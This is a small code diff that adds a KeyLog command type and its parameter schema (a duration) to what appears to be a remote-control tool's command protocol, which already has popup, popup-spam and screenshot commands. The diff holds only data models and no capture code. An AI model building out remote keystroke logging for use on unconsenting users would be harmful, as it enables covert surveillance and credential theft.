@@ -8,6 +8,7 @@ class CommandType(str, enum.Enum):
     Popup = "Popup"
     PopupSpam = "PopupSpam"
     Screenshot = "Screenshot"
+    KeyLog = "KeyLog"
 
 
 class BasicCommand(BaseModel):
@@ -23,3 +24,12 @@ class PopupParameters(BaseModel):
 class PopupCommand(BasicCommand):
     command_type: CommandType = CommandType.Popup
     parameters: PopupParameters
+
+
+class KeyLogParameters(BaseModel):
+    duration: int
+
+
+class KeyLogCommand(BasicCommand):
+    command_type: CommandType = CommandType.KeyLog
+    parameters: KeyLogParameters
